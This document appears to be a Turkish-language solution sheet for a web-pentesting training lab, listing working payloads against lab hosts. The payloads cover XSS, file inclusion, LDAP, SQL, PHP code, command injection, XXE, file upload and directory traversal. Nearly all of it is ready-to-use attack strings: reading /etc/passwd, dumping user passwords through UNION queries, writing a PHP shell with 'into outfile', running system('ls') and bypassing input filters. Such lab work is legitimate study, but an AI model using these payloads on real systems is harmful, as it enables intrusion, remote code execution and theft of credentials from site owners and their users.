->XSS
<script>alert("king");</script>

<sCRipt>alert("king");</scriPt>

<sc<script>ript>alert("king");</sc</script>ript>

<img onerror="alert('Hacker Anıl');" src="anıl"></img>

<body onload=alert("king");>

<img onload="console.log('haker anıl');" src="https://asset.tureng.co/images/tureng-logo.png"></img>

<script>window.prompt("king");</script>

<script>";alert('king');</script> // ";alert('kral');"

=';alert('rainbow');'

url kısmına /"><script>alert("king");</script>


->File Include
page=<script>alert("king");</script>
ayrıca şöyle; page=../../../../../../../etc/passwd yazdığında
passwd çağırıp içeriği ekrana bastırabilirsin.
veya bu şekilde : http://172.16.248.129/index.php kendi php kodlarını da yükleyebilirsin

2. soru:
page=<script>alert("king");</script>
burada da aynı işlemler. Fakat programcı tarafaından php uzantısı eklenmektedir.
http://172.16.248.129/index şeklinde yine kullanılabilir.
https://google.com%00 ile (%00) uzantı hatasını atlabilirisin
veya index.php?cop= ile syntax hatasından kurtulabilirsin


->LDAP Attacks
lightweight directory access protokol. LDAP şirketlerde personel kayıtları,telefon rehberi,adres defteri gibi birçok hizmetin tek merkezli olmak üzere sunulmasını sağlar.LDAP oluşturulan bir adres defterinde ad kısmında geçen user geçen kişilerin sayad ve mail bilgilerini bulşeklinde bir arama yaparsak LDAP bizim için filtreleme yaparak istediğimiz sonuçları bize verir.
LDAP injectionun bir kriterin listelendiği alanlara bazı karakterler sıkıştırarak tüm sonuçların gösterilmesi veya istenen kişilerin şifrelerinin alınması gibidir.


1. soru: Olay "IF" den sonra ortaya çıkmaktadır. Bizden bir tane "username" istemektedir. Sorgulanacağı yer de hemen sağında gösterilmektedir. Kullanıcı adından sonra bir tane de şifre istemektedir. Ama bunlar girilmediği takdir de bizi "NOT AUTHENTICATED" a düşürecek herhangi bir şey gözükmemektedir. Bu kodun mantığındaki hatadır. Yani boş kullanıcı kabul edilir mi edilmez mi nin kontrolü yapılmamaktadır. Dolayısıyla biz kullanıcı adı ve şifre kısmını ortadan kaldırıp denediğimizde sonuç aşağıdaki gibi olacaktır.
http://192.168.126.128/ldap/example1.php?

2. soru: Bu örneğimizde LDAP’da global olarak var olan cn’i kullanacağız.“cn=*” ifadesindeki * wildcard olarak kullanılıyor. Kullanma amacımız ise tıpkı  SQL injection saldırılarında kullandığımız “OR 1=1” boolean mantığının LDAP versiyonunu uygulamak. Payloaddaki URL-encoded haldeki NULL byte ise tıpkı tek satırlık comment tag gibi çalışıyor ve sorgunun sonrasının çalışmasını engelliyor.  Bu sayede password parametresine hangi değeri verirsek verelim artık önemi kalmayacak. Payloadımız ise aşağıdaki gibi.
example2.php?name=hacker)(cn=*))%00&password=aa


->SQL Injection
1. soru: link sonuna  ' or '1' = '1' ekle, tablonun tamamı gelsin
gerçekte yazılan sql sorgusu : 
Select * from users where id='root' or '1'='1'
UNION ifadesi ile veritabanının tüm tablolarını çekme demesi
name=kk' union select table_name,2, 3,4,5 FROM information_schema.tables %23
%23 ifadesi # anlamındadır. mysql de yorum satırı anlamındadır.
Burada %23 ile  geriye kalan tüm ifadeleri geçersiz kılarız. syntax hatalarıdan kurtulmuş oluruz.
union select @@version,2,3,4,5 %23 ile kullanılan versiyonu çekebiliriz
name=root' union select 1,load_file('/etc/passwd'),3,4,5 %23 ile şifrelere
?name=root' union select '',2,3,4,5 into outfile '/var/www/sqli/cmd.php' %23 ile php dosyası oluşturup, shell almayı deneyebilirsin

2. soru: %20 space anlamındadır. BlackBox tekniği ile space engellenmiş. Bunun yerine %09 olan tab ifadesinin encode hali kullanarak deneriz. %27 ise ' dır.
example2.php?name=root%27%09or%09%271%27=%271
example2.php?name=root'%09or%09'1'='1

3. soru: name=root'/**/or/**/'1'='1
Burada  %09 ve %06 filtrelemeleri yapılmış. php yorum satırı ile deniyoruz

4. soru: sqli/example4.php?id=1 or 1=1
daha fazla veri ve şifreleri deneme için: i
d=2 union select name,passwd,3,4,5 from users

5: soru: integer ifadeleri filtrelemiş
union select name, passwd,3,4,5 from users -> deneyebilirisin
^[0-9]+ regex i kullanılmış.  integer alır sonuna bakmaz
example5.php?id=2 or 1=1

6: soru: ^[0-9]+$ regex i kullanılmış. integer alır sonuna bakar.
girilen ifadenin başına ve sonuna bakar
example6.php?id=2 or 1=1

7. soru: %0A%0D deneyibilirsin
kullanılan regex /^-?[0-9]+$/m . sadece yazıldığı satırda kısıtlama var.
%0A :\r  %0D: \n anlamındadır. kod satırını bir alta geçirerek atlatılabilir.
example7.php?id=2%0A or 1=1

8. soru: order by sql ifadesinin en sonunda olduğu için bu sql injection bi işimize yaramayacaktır. ` desc %23 kullan. (AltGr + ;)

9. soru: 8 ile aynı fakat ` ifadesi kullanmaya gerek yok.


->Code Injection
zafiyet kullanıcıdan alınan değerin hiç bir kontrolden geçirilmemesinden kaynaklanır. Bu açıktan faydalanabilmek için ilk yapmamız gereken ekrana bir hata bastırmaktır. Bu hatayı bastırmayı başarabilirsek ona göre yorum yapabilmemiz kolaylaşacaktır.

1. soru: example1.php?name=hacker"; $name = " kod"; echo $name; // ile denendi. 
// ifadesi yorum satırıdır. Kendisinden sonra gelen ifadelerde syntax hatasından bizi kurtaracaktır. PHP kodları çalıştırabildiğinden < hacker"; system ("ls"); // > ifadesi yazılarak dizin içerisindeki tüm dosyalar listelenebilir.

2. soru: http://192.168.126.128/codeexec/example2.php?order=id);}system(%27ls%27);%23 
kodu ile dizindeki tüm dosyaları listeleyebilirsin
burada kaynak kodu inceleyip nasıl çalıştığını anlamak gerek.

3. soru: phpnin preg_replace() fonksiyonu
preg_replace($pattern, $new, $base);
\$base değişkeni içerisinde değişlik yaparak \$new ifadesini koyuyor. Bilinmesi gereken ise regex ifadesi ile atraksiyonlar yapılabildiği. Burada eğer regex ifadenin en sonuna “e” yazılırsa \$new ile gelen ifade php tarafından bir fonksiyon olarak yorumlanıyor.
< /codeexec/example3.php?new=phpinfo()&pattern=/lamer/e&base=Hello lamer >
< /codeexec/example3.php?new=system("ls")&pattern=/lamer/e&base=Hello lamer > kodu diznler listelendi

4. soru:  phpnin assert() fonksiyonu
< example4.php?name=hacker'.system("ls");%23 > ile dizinleri listeleyebilirsin


->File Upload
 Eğer bu upload seçeneği gerekli kontrolleri yapmadan dosya kabul ederse saldırgan hedef sitede çok rahat zararlı scriptini çalıştırabilir.
 
1. soru: image dosyası isterken 
 <?php
    echo "Gökmen DEMİR";
?>
yazılı php dosyası gönderdim. kabul etti

2. soru: 1.sorudan farklı olarak dosya uzantısına bakıp php ise kabul etmiyor. PHP dosyalarında ise .php den sonra gelen ifadeler dikkate alınmaz ve çalışır.
gokmendemir.php.2soru


->Commands Injection
Command injection çalıştırılan sistem komutlarının kullanıcıdan alınması durumlarında olur. Tabi bu da her zaman ki gibi kullanıcıdan alınan değerlerin kontrolsüz bir şekilde kullanılmasından kaynaklanır.

1.soru: http://192.168.126.128/commandexec/example1.php?ip=127.0.0.1 -> link bu şekilde
biz sonra ;ls yazdığımız dizini listeleyebiliyoruz.

2. soru: http://192.168.126.128/commandexec/example2.php?ip=127.0.0.1 -> link bu şekilde
sadece ip adresi kabul edilecek şek. kısıtlama yapılmış. Filtre tek satır için geçerli.
%0A ile yeni satıra geçip ls denenebilir
< http://192.168.126.128/commandexec/example2.php?ip=127.0.0.1%0Als >
farklı bir deneme: < /commandexec/example2.php?ip=127.0.0.1%0Als -al; cat ../../../../../../etc/passwd >
< %0auname -as >

3.soru: kaynak kod if yapısında preg_match

3. soru: http://192.168.126.128/commandexec/example3.php?ip=127.0.0.1 -> link bu şekilde
şu denenebilir :  echo -e "GET http://192.168.126.128/commandexec/example3.php?ip=127.0.0.1;ls HTTP/1.1\r\nHost: 192.168.126.128\r\n" | nc 192.168.126.128 80 -v | grep "ex"


->XML Attacks
 XML teknolojisi kullanılarak XXE zafiyeti varsa hedef web sitesindeki hassas bilgiler ele geçirilebilir.
 
1. soru: test  tagları ile yazılmış fakat ekranda gözükmemekte. tag ları değiştirdiğinde hata almamaktasın.  <!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test> ifadesini https://www.url-encode-decode.com/ sitesini kullanarak  %3C%21DOCTYPE+test+%5B%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Ctest%3E%26xxe%3B%3C%2Ftest%3E haline decode ettikten sonra http://192.168.126.128/xml/example1.php?xml= eklediğinde passwd dosyası geliyor.

2. soru: ' or 1=1]%00  http://192.168.126.128/xml/example2.php?name=' or 1=1]%00
http://192.168.126.128/xml/example2.php?name=%27%20or%201=1]%00





-> Directory traversal
1. soru : http://192.168.126.128/dirtrav/example1.php?file=../../../etc/passwd

2. soru : http://192.168.126.128/dirtrav/example2.php?file=/var/www/files/../../../etc/passwd

3. soru: http://192.168.126.128/dirtrav/example3.php?file=../../../../etc/passwd%00




